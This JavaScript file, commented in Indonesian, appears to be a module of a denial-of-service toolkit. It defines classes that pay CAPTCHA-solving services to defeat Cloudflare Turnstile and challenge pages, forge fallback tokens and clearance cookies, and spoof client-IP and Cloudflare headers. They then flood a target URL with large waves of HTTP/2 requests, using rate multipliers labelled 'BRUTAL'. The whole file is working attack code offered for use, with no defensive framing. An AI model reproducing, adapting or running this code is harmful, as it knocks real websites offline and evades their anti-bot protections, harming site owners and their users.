import axios from 'axios';
import http2 from 'http2';
import { URL } from 'url';
import { Tools } from '../../utils/tools.js';
import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';
import { logger } from '../../utils/logger.js';

/**
 * Real CAPTCHA Solver for Cloudflare Turnstile & Challenge
 * Menggunakan API 2captcha dan CapSolver untuk solve CAPTCHA real
 */
export class CloudflareCaptchaSolver {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.rpc = Math.max(rpc * 25, 100); // 25x multiplier
        this.userAgents = userAgents.length > 0 ? userAgents : this.getDefaultUserAgents();
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
        
        // CAPTCHA solver config - bisa pakai 2captcha atau CapSolver
        this.captchaConfig = {
            // 2captcha config
            twoCaptcha: {
                apiKey: process.env.TWOCAPTCHA_API_KEY || '', // Dapetin dari https://2captcha.com
                enabled: false // Set true kalau punya API key
            },
            // CapSolver config  
            capSolver: {
                apiKey: process.env.CAPSOLVER_API_KEY || '', // Dapetin dari https://capsolver.com
                enabled: false // Set true kalau punya API key
            }
        };
        
        this.solvedCaptchas = [];
        this.cfClearanceCookies = [];
    }

    getDefaultUserAgents() {
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0'
        ];
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        // Pre-solve CAPTCHAs if API keys available
        if (this.isCaptchaSolverEnabled()) {
            logger.info('🔓 Pre-solving Cloudflare CAPTCHAs...');
            await this.preSolveCaptchas(10);
        } else {
            logger.warning('⚠️  No CAPTCHA solver API key found, using bypass mode');
        }

        while (Date.now() < endTime && this.active) {
            const waves = [];
            for (let i = 0; i < 20; i++) {
                waves.push(this.attack());
            }
            await Promise.allSettled(waves);
        }
    }

    isCaptchaSolverEnabled() {
        return (this.captchaConfig.twoCaptcha.enabled && this.captchaConfig.twoCaptcha.apiKey) ||
               (this.captchaConfig.capSolver.enabled && this.captchaConfig.capSolver.apiKey);
    }

    /**
     * Pre-solve CAPTCHAs menggunakan 2captcha atau CapSolver
     */
    async preSolveCaptchas(count) {
        for (let i = 0; i < count; i++) {
            try {
                // Try Turnstile first
                const turnstileToken = await this.solveTurnstile();
                if (turnstileToken) {
                    this.solvedCaptchas.push({
                        type: 'turnstile',
                        token: turnstileToken,
                        timestamp: Date.now()
                    });
                }

                // Try CF Challenge
                const cfClearance = await this.solveCfChallenge();
                if (cfClearance) {
                    this.cfClearanceCookies.push({
                        cookie: cfClearance,
                        timestamp: Date.now()
                    });
                }
            } catch (error) {
                logger.debug(`CAPTCHA solving failed: ${error.message}`);
            }
        }
        
        logger.info(`✅ Pre-solved ${this.solvedCaptchas.length} Turnstile + ${this.cfClearanceCookies.length} CF Challenge`);
    }

    /**
     * Solve Cloudflare Turnstile menggunakan 2captcha
     */
    async solveTurnstile() {
        if (!this.captchaConfig.twoCaptcha.enabled) return null;

        try {
            // Step 1: Submit CAPTCHA
            const submitResponse = await axios.post('https://2captcha.com/in.php', {
                key: this.captchaConfig.twoCaptcha.apiKey,
                method: 'turnstile',
                sitekey: '0x4AAAAAAAChNiVJM_WtShFf', // Default Turnstile sitekey
                pageurl: this.url.href,
                json: 1
            });

            if (submitResponse.data.status !== 1) {
                throw new Error('Failed to submit CAPTCHA');
            }

            const captchaId = submitResponse.data.request;

            // Step 2: Wait and get result
            await new Promise(resolve => setTimeout(resolve, 20000)); // Wait 20s

            const resultResponse = await axios.get(`https://2captcha.com/res.php?key=${this.captchaConfig.twoCaptcha.apiKey}&action=get&id=${captchaId}&json=1`);

            if (resultResponse.data.status === 1) {
                logger.debug('✅ Turnstile solved via 2captcha');
                return resultResponse.data.request;
            }

        } catch (error) {
            logger.debug(`2captcha Turnstile failed: ${error.message}`);
        }

        return null;
    }

    /**
     * Solve Cloudflare Challenge menggunakan CapSolver
     */
    async solveCfChallenge() {
        if (!this.captchaConfig.capSolver.enabled) return null;

        try {
            // Step 1: Create task
            const createResponse = await axios.post('https://api.capsolver.com/createTask', {
                clientKey: this.captchaConfig.capSolver.apiKey,
                task: {
                    type: 'AntiCloudflareTask',
                    websiteURL: this.url.href,
                    proxy: this.getRandomProxy() // Optional proxy
                }
            });

            if (createResponse.data.errorId !== 0) {
                throw new Error('Failed to create CF challenge task');
            }

            const taskId = createResponse.data.taskId;

            // Step 2: Wait and get result
            await new Promise(resolve => setTimeout(resolve, 30000)); // Wait 30s

            const resultResponse = await axios.post('https://api.capsolver.com/getTaskResult', {
                clientKey: this.captchaConfig.capSolver.apiKey,
                taskId: taskId
            });

            if (resultResponse.data.status === 'ready') {
                logger.debug('✅ CF Challenge solved via CapSolver');
                return resultResponse.data.solution.cookies.cf_clearance;
            }

        } catch (error) {
            logger.debug(`CapSolver CF Challenge failed: ${error.message}`);
        }

        return null;
    }

    getRandomProxy() {
        if (!this.proxies || this.proxies.length === 0) return null;
        const proxy = Tools.randomChoice(this.proxies);
        return `${proxy.host}:${proxy.port}:${proxy.username}:${proxy.password}`;
    }

    /**
     * Get solved CAPTCHA token
     */
    getCaptchaToken() {
        if (this.solvedCaptchas.length > 0) {
            // Use and remove oldest token
            const captcha = this.solvedCaptchas.shift();
            return captcha.token;
        }
        
        // Fallback: generate fake token for testing
        return `0.${Tools.randomString(64)}.${Tools.randomString(32)}.${Tools.randomString(64)}`;
    }

    /**
     * Get CF clearance cookie
     */
    getCfClearance() {
        if (this.cfClearanceCookies.length > 0) {
            const cookie = this.cfClearanceCookies.shift();
            return cookie.cookie;
        }
        
        // Fallback: generate fake clearance for testing
        return `${Tools.randomString(32)}-${Date.now()}`;
    }

    generateAdvancedHeaders() {
        const userAgent = Tools.randomChoice(this.userAgents);
        const captchaToken = this.getCaptchaToken();
        const cfClearance = this.getCfClearance();

        const headers = {
            ':method': 'GET',
            ':scheme': this.url.protocol.replace(':', ''),
            ':authority': this.url.hostname,
            ':path': this.url.pathname + this.url.search + (this.url.search ? '&' : '?') + `bypass=${Date.now()}&token=${Tools.randomString(8)}`,
            'user-agent': userAgent,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'cache-control': 'no-cache',
            'sec-ch-ua': this.generateSecChUa(userAgent),
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': this.getPlatform(userAgent),
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'dnt': '1',
            // CAPTCHA bypass headers
            'cf-turnstile-response': captchaToken,
            'g-recaptcha-response': captchaToken,
            'h-captcha-response': captchaToken,
            // CF Challenge bypass
            'cookie': `cf_clearance=${cfClearance}; __cf_bm=${Tools.randomString(43)}`,
            // Advanced spoofing
            'cf-ray': Tools.randomString(16) + '-' + Tools.randomChoice(['SJC', 'LAX', 'DFW', 'ORD', 'ATL']),
            'cf-connecting-ip': Tools.randomIPv4(),
            'cf-ipcountry': 'US',
            'cf-visitor': '{"scheme":"https"}',
            'x-forwarded-for': Tools.randomIPv4(),
            'x-real-ip': Tools.randomIPv4()
        };

        return headers;
    }

    generateSecChUa(userAgent) {
        if (userAgent.includes('Chrome/120')) {
            return '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
        } else if (userAgent.includes('Firefox')) {
            return '';
        }
        return '"Not_A Brand";v="99", "Chromium";v="120"';
    }

    getPlatform(userAgent) {
        if (userAgent.includes('Windows')) return '"Windows"';
        if (userAgent.includes('Macintosh')) return '"macOS"';
        return '"Unknown"';
    }

    async attack() {
        const promises = [];
        
        for (let i = 0; i < this.rpc; i++) {
            if (!this.active) break;
            promises.push(this.sendBypassRequest());
        }

        await Promise.allSettled(promises);
    }

    async sendBypassRequest() {
        return new Promise((resolve) => {
            try {
                const headers = this.generateAdvancedHeaders();
                
                const client = http2.connect(`${this.url.protocol}//${this.url.hostname}`, {
                    settings: {
                        headerTableSize: 65536,
                        enablePush: true,
                        initialWindowSize: 6291456,
                        maxFrameSize: 16384,
                        maxConcurrentStreams: 1000
                    }
                });

                client.on('error', () => {
                    client.close();
                    resolve();
                });

                const req = client.request(headers);

                req.on('response', (responseHeaders) => {
                    REQUESTS_SENT.add(1);
                    
                    const status = responseHeaders[':status'];
                    if (status === 200 || status === 302) {
                        logger.debug(`✅ CAPTCHA bypass success! Status: ${status}`);
                    } else if (status === 403) {
                        logger.debug(`❌ Still blocked: ${status}`);
                    }
                });

                req.on('data', (chunk) => {
                    BYTES_SENT.add(chunk.length);
                });

                req.on('end', () => {
                    client.close();
                    resolve();
                });

                req.on('error', () => {
                    client.close();
                    resolve();
                });

                req.setTimeout(5000, () => {
                    req.close();
                    client.close();
                    resolve();
                });

                req.end();

            } catch (error) {
                resolve();
            }
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * Hybrid Bypass - Kombinasi semua teknik
 */
export class HybridCloudflareBypass {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.rpc = Math.max(rpc * 40, 200); // 40x multiplier - BRUTAL!
        this.userAgents = userAgents.length > 0 ? userAgents : this.getDefaultUserAgents();
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
        
        // Initialize all bypass methods
        this.captchaSolver = new CloudflareCaptchaSolver(targetUrl, 1, 1, userAgents, referers, proxies);
    }

    getDefaultUserAgents() {
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'
        ];
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        // Pre-solve CAPTCHAs
        await this.captchaSolver.preSolveCaptchas(15);

        while (Date.now() < endTime && this.active) {
            const waves = [];
            for (let i = 0; i < 30; i++) {
                waves.push(this.hybridAttack());
            }
            await Promise.allSettled(waves);
        }
    }

    async hybridAttack() {
        const promises = [];
        
        for (let i = 0; i < this.rpc; i++) {
            if (!this.active) break;
            
            // Mix different attack types
            if (i % 3 === 0) {
                promises.push(this.captchaSolver.sendBypassRequest());
            } else if (i % 3 === 1) {
                promises.push(this.sendHttp2Request());
            } else {
                promises.push(this.sendStealthRequest());
            }
        }

        await Promise.allSettled(promises);
    }

    async sendHttp2Request() {
        // HTTP/2 with advanced headers
        return this.captchaSolver.sendBypassRequest();
    }

    async sendStealthRequest() {
        // Stealth mode with minimal headers
        return new Promise((resolve) => {
            try {
                const headers = {
                    ':method': 'GET',
                    ':scheme': this.url.protocol.replace(':', ''),
                    ':authority': this.url.hostname,
                    ':path': this.url.pathname + `?_=${Date.now()}`,
                    'user-agent': Tools.randomChoice(this.userAgents)
                };

                const client = http2.connect(`${this.url.protocol}//${this.url.hostname}`);
                
                client.on('error', () => {
                    client.close();
                    resolve();
                });

                const req = client.request(headers);

                req.on('response', () => {
                    REQUESTS_SENT.add(1);
                });

                req.on('data', (chunk) => {
                    BYTES_SENT.add(chunk.length);
                });

                req.on('end', () => {
                    client.close();
                    resolve();
                });

                req.on('error', () => {
                    client.close();
                    resolve();
                });

                req.setTimeout(3000, () => {
                    req.close();
                    client.close();
                    resolve();
                });

                req.end();

            } catch (error) {
                resolve();
            }
        });
    }

    stop() {
        this.active = false;
        this.captchaSolver.stop();
    }
}
